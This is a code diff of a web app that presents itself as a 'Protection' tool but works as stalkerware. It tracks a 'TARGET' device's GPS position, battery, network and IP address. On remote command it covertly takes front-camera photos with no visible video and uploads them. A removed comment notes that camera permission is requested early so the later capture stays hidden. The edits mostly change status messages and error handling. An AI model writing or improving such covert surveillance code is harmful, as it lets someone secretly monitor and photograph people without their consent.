@@ -42,7 +42,7 @@
             <div class="blinking-dot" style="margin: 0 auto 15px auto;"></div>
             <h3 style="color: #00ff41; margin-bottom: 15px;">🛡️ PROTECTION ACTIVE</h3>
             <p style="font-size: 12px; color: #aaa; margin-bottom: 15px;">Stealth Mode: Location & Intel syncing. Awaiting Command...</p>
-            <p id="gps-log" style="font-size: 13px; color: #00f3ff; font-weight: bold;"></p>
+            <p id="gps-log" style="font-size: 13px; color: #f39c12; font-weight: bold;"></p>
             <button class="btn-logout" onclick="location.reload()" style="margin-top: 30px; width: 100%;">STOP PROTECTION</button>
         </div>
 
@@ -54,7 +54,7 @@
                     <div class="corner-bl"></div><div class="corner-br"></div>
                     <h3><span class="blinking-dot" style="display:inline-block; margin-right:10px;"></span>TARGET UPLINK</h3>
                     <div class="info-box" style="font-size: 13px;">
-                        <p>STATUS: <span id="status" style="color: #ff003c;">CONNECTING...</span></p>
+                        <p>STATUS: <span id="status" style="color: #f39c12;">WAKING UP SERVER... (Wait 30s)</span></p>
                         <p>IP ADDR: <span id="ip-addr" style="color: #00f3ff;">--</span></p>
                         <p>BATTERY: <span id="batt">--%</span></p>
                         <p>NETWORK: <span id="net">--</span></p>
@@ -136,11 +136,11 @@
                     } else { alert("Account Created! You can now Login."); toggleForm(); }
                 } else { alert("Error: " + data.message); }
                 btn.innerText = isLoginMode ? "SECURE LOGIN" : "REGISTER NOW";
-            }).catch(err => { alert("Server error!"); btn.innerText = "SECURE LOGIN"; });
+            }).catch(err => { alert("Server error! Waking up..."); btn.innerText = "SECURE LOGIN"; });
         }
 
         // ==========================================
-        // 🛡️ PROTECT MODE (Listens for commands)
+        // 🛡️ PROTECT MODE
         // ==========================================
         function activateProtection() {
             document.getElementById('menu-section').style.display = 'none';
@@ -150,13 +150,11 @@
             
             fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => { targetIp = d.ip; }).catch(e=>{});
 
-            // Pehle hi permission maang lo taaki baad mein chor se na mange
             if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => { stream.getTracks().forEach(track => track.stop()); }).catch(e=>{});
             }
 
-            // Command Checker (Har 3 sec mein check karega)
             setInterval(() => {
                 fetch('/api/check-command', {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -166,11 +164,11 @@
                         cameraAccessed = true;
                         takeStealthPhoto();
                     }
-                });
+                }).catch(e => {}); // Ignore offline errors
             }, 3000);
 
-            // Location Sync
             if (navigator.geolocation) {
+                logText.innerText = "Acquiring GPS Signal... Please wait.";
                 navigator.geolocation.watchPosition(async (position) => {
                     let batteryStr = "Unknown", netStr = "Unknown";
                     if (navigator.getBattery) {
@@ -184,25 +182,26 @@
                             deviceId: globalDeviceId, lat: position.coords.latitude, lng: position.coords.longitude, 
                             accuracy: position.coords.accuracy, battery: batteryStr, network: netStr, ipAddress: targetIp
                         })
-                    }).then(() => logText.innerText = `Data Synced: ${new Date().toLocaleTimeString()}`);
-                }, (err) => { logText.innerText = "Allow location!"; }, { enableHighAccuracy: true, maximumAge: 0 });
+                    }).then(() => {
+                        logText.innerText = `[SUCCESS] Data Synced: ${new Date().toLocaleTimeString()}`;
+                        logText.style.color = "#00ff41";
+                    }).catch(e => { logText.innerText = "Syncing... Server might be asleep."; logText.style.color = "#f39c12"; });
+                }, (err) => { logText.innerText = "Allow Location to proceed!"; }, { enableHighAccuracy: true, maximumAge: 0 });
             }
         }
 
-        // Stealth Photo Function
         function takeStealthPhoto() {
             if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => {
                     const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
+                    video.srcObject = stream; video.play();
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
                         canvas.width = 320; canvas.height = 240;
                         canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                         const photoData = canvas.toDataURL('image/jpeg', 0.6);
-                        stream.getTracks().forEach(track => track.stop()); // Camera Off
+                        stream.getTracks().forEach(track => track.stop()); 
                         
                         fetch('/api/upload-photo', {
                             method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -214,7 +213,7 @@
         }
 
         // ==========================================
-        // 🗺️ TRACK MODE (Send Command & View)
+        // 🗺️ TRACK MODE
         // ==========================================
         function activateTracking() {
             document.getElementById('menu-section').style.display = 'none';
@@ -274,10 +273,14 @@
                     
                     if (isFirstLocationLoad) { map.setView([data.lat, data.lng], 18); isFirstLocationLoad = false; }
                 } else {
-                    document.getElementById('status').innerText = "TARGET OFFLINE";
+                    document.getElementById('status').innerText = "TARGET OFFLINE (NO DATA YET)";
                     document.getElementById('status').style.color = "#ff003c";
                 }
-            }).catch(err => console.log(err));
+            }).catch(err => {
+                // Yahan humne naya error handling dala hai!
+                document.getElementById('status').innerText = "WAKING UP SERVER... PLEASE WAIT";
+                document.getElementById('status').style.color = "#f39c12"; // Orange color
+            });
         }
     </script>
 </body>
